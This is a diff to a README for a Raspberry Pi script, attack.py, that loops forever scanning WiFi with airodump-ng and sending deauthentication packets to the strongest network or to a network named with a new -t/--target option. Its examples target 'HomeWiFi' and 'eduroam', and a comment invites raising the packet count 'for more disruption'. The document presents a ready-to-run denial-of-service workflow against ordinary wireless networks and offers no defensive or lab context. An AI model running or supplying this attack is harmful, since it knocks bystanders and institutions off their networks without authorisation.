@@ -24,10 +24,13 @@ The system uses a dual-WiFi setup:
 
 ### Attack Workflow
 
-1. **Scan Phase**: `airodump-ng` scans all channels for 10 seconds
-2. **Parse Phase**: Script reads CSV and identifies the strongest AP
-3. **Attack Phase**: Sends 100 deauth packets to the target
-4. **Repeat**: Loop continues indefinitely
+1. **Setup Phase**: Automatically enables monitor mode (kills interfering processes, stops/starts fresh)
+2. **Scan Phase**: `airodump-ng` scans all channels for 10 seconds
+3. **Parse Phase**: Script reads CSV and identifies the strongest AP
+4. **Attack Phase**: Sends 100 deauth packets to the target using broadcast addressing
+5. **Repeat**: Loop continues indefinitely
+
+The script automatically handles monitor mode setup every time it runs, so you don't need to worry about manually enabling it.
 
 ## What You Need
 
@@ -243,7 +246,15 @@ sudo raspi-config
    ```
 4. **Run the attack**:
    ```bash
+   # Attack strongest network (default)
    sudo python3 attack.py
+   
+   # Attack specific network by name
+   sudo python3 attack.py -t "HomeWiFi"
+   sudo python3 attack.py --target "eduroam"
+   
+   # View help
+   sudo python3 attack.py --help
    ```
 
 ### Stopping the Attack
@@ -258,13 +269,24 @@ All detected access points are logged to CSV files in `/home/pi/dump/`:
 
 ## Configuration
 
-Edit these variables in `attack.py` to customize behavior:
+### Command-Line Options
+
+Target a specific network using the `-t` or `--target` argument:
+
+```bash
+# Attack strongest network (default)
+sudo python3 attack.py
+
+# Attack specific network
+sudo python3 attack.py -t "HomeWiFi"
+sudo python3 attack.py --target "eduroam"
+```
+
+### Advanced Configuration
+
+Edit these variables in `attack.py` for advanced customization:
 
 ```python
-# Target Configuration
-target_essid = "eduroam"          # Specific network name to target
-                                   # Set to None for strongest signal mode
-
 # Attack Configuration
 dump_dir = "/home/pi/dump"        # Where to save CSV files
 deauth_num_pkts = 100             # Packets per attack (increase for more disruption)
